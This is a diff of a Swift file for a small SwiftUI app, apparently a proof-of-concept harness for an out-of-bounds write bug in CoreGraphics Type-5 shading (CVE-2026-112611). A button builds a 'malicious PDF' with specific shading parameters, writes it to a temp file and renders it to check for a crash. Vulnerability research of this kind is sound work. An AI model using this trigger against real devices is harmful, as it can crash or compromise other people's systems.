@@ -2,6 +2,110 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
+// MARK: - App Entry Point
+@main
+struct SafeShadingDemoApp: App {
+    var body: some Scene {
+        WindowGroup {
+            ContentView()
+        }
+    }
+}
+
+// MARK: - Content View
+struct ContentView: View {
+    @State private var status = "Ready to trigger CVE-2026-112611"
+    @State private var isTriggering = false
+    
+    var body: some View {
+        VStack(spacing: 30) {
+            Text("CVE-2026-112611")
+                .font(.largeTitle)
+                .bold()
+            
+            Text("CoreGraphics Type-5 Shading OOB")
+                .font(.headline)
+            
+            Text(status)
+                .font(.system(.body, design: .monospaced))
+                .foregroundColor(.secondary)
+                .padding()
+                .multilineTextAlignment(.center)
+            
+            Button(action: triggerBug) {
+                Text(isTriggering ? "Triggering..." : "Trigger OOB Write")
+                    .font(.title2)
+                    .bold()
+                    .foregroundColor(.white)
+                    .padding()
+                    .background(isTriggering ? Color.gray : Color.red)
+                    .cornerRadius(10)
+            }
+            .disabled(isTriggering)
+        }
+        .padding()
+    }
+    
+    func triggerBug() {
+        isTriggering = true
+        status = "Generating malicious PDF..."
+        
+        let pdfData = PDFPayload.shading(
+            rangeDim: 136,
+            value: 1.0,
+            verticesPerRow: 2,
+            rows: 2
+        )
+        
+        status = "Writing to temp file..."
+        
+        let tempURL = FileManager.default.temporaryDirectory
+            .appendingPathComponent("trigger.pdf")
+        
+        do {
+            try pdfData.write(to: tempURL)
+        } catch {
+            status = "ERROR: Write failed"
+            isTriggering = false
+            return
+        }
+        
+        status = "Rendering with CoreGraphics..."
+        
+        guard let provider = CGDataProvider(url: tempURL as CFURL) else {
+            status = "ERROR: No data provider"
+            isTriggering = false
+            return
+        }
+        
+        guard let doc = CGPDFDocument(provider) else {
+            status = "ERROR: No PDF document"
+            isTriggering = false
+            return
+        }
+        
+        guard let page = doc.page(at: 1) else {
+            status = "ERROR: No page 1"
+            isTriggering = false
+            return
+        }
+        
+        guard let context = CGContext(data: nil, width: 256, height: 256,
+                                      bitsPerComponent: 8, bytesPerRow: 256 * 4,
+                                      space: CGColorSpaceCreateDeviceRGB(),
+                                      bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else {
+            status = "ERROR: No context"
+            isTriggering = false
+            return
+        }
+        
+        context.drawPDFPage(page)
+        
+        status = "Rendered (check for crash)"
+        isTriggering = false
+    }
+}
+
 // MARK: - PDF Payload Builder
 enum PDFPayload {
     static func shading(rangeDim: Int, value: Double = 1.0, verticesPerRow: Int = 2, rows: Int = 2) -> Data {
@@ -107,105 +211,5 @@ struct PDFBuilder {
         out.append(Data(trailer.utf8))
         
         return out
-    }
-}
-
-// MARK: - Main View
-struct ContentView: View {
-    @State private var status = "Ready to trigger CVE-2026-112611"
-    @State private var isTriggering = false
-    
-    var body: some View {
-        VStack(spacing: 30) {
-            Text("CVE-2026-112611")
-                .font(.largeTitle)
-                .bold()
-            
-            Text("CoreGraphics Type-5 Shading OOB")
-                .font(.headline)
-            
-            Text(status)
-                .font(.system(.body, design: .monospaced))
-                .foregroundColor(.secondary)
-                .padding()
-                .multilineTextAlignment(.center)
-            
-            Button(action: triggerBug) {
-                Text(isTriggering ? "Triggering..." : "Trigger OOB Write")
-                    .font(.title2)
-                    .bold()
-                    .foregroundColor(.white)
-                    .padding()
-                    .background(isTriggering ? Color.gray : Color.red)
-                    .cornerRadius(10)
-            }
-            .disabled(isTriggering)
-        }
-        .padding()
-    }
-    
-    func triggerBug() {
-        isTriggering = true
-        status = "Generating malicious PDF..."
-        
-        let pdfData = PDFPayload.shading(
-            rangeDim: 136,
-            value: 1.0,
-            verticesPerRow: 2,
-            rows: 2
-        )
-        
-        status = "Writing to temp file..."
-        
-        let tempURL = FileManager.default.temporaryDirectory
-            .appendingPathComponent("trigger.pdf")
-        
-        do {
-            try pdfData.write(to: tempURL)
-        } catch {
-            status = "ERROR: Write failed"
-            isTriggering = false
-            return
-        }
-        
-        status = "Rendering with CoreGraphics..."
-        
-        guard let provider = CGDataProvider(url: tempURL as CFURL) else {
-            status = "ERROR: No data provider"
-            isTriggering = false
-            return
-        }
-        
-        guard let doc = CGPDFDocument(provider) else {
-            status = "ERROR: No PDF document"
-            isTriggering = false
-            return
-        }
-        
-        guard let page = doc.page(at: 1) else {
-            status = "ERROR: No page 1"
-            isTriggering = false
-            return
-        }
-        
-        guard let context = CGContext(data: nil, width: 256, height: 256,
-                                      bitsPerComponent: 8, bytesPerRow: 256 * 4,
-                                      space: CGColorSpaceCreateDeviceRGB(),
-                                      bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else {
-            status = "ERROR: No context"
-            isTriggering = false
-            return
-        }
-        
-        context.drawPDFPage(page)
-        
-        status = "Rendered (check for crash)"
-        isTriggering = false
-    }
-}
-
-struct ContentView_Previews: PreviewProvider {
-    static var previews: some View {
-        ContentView()
     }
 }
